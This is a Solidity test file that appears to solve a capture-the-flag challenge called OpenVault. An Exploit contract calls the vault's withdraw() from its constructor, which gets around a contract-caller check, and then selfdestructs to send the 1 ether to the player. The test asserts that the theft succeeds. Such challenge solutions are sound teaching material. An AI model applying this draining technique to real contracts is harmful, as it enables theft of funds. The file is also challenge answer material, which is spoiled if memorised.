// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

import "./utils/BaseTest.sol";

import "src/accounts/OpenVaultChallenge.sol";

contract Exploit {
    constructor(OpenVaultChallenge openVault) {
        openVault.withdraw();
        selfdestruct(payable(msg.sender));
    }
}

contract TestOpenValutChallenge is BaseTest {
    OpenVaultChallenge private challenge;

    address private player;

    uint256 constant VAULT_INITIAL_FUNDS = 1 ether;

    constructor() {
        // Created (during `setUp()`) users will be available in `users` state variable

        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(userLabels.length, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Deployer create the OpenVault with some funds, attacker needs to steal them
        challenge = new OpenVaultChallenge{value: VAULT_INITIAL_FUNDS}();
        player = users[0];
    }

    function testExploit() public {
        runTest();
    }

    function exploit() internal override {
        uint256 balanceBefore = player.balance;

        // both msg.sender and tx.origin are set to player address
        vm.startPrank(player, player);

        // Deploy the exploit contract that will be created, will do the `withdraw` and selfdestruct sending funds to the player
        new Exploit(challenge);

        assertEq(player.balance, balanceBefore + VAULT_INITIAL_FUNDS);

        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        assertEq(challenge.isSolved(), true);
    }
}
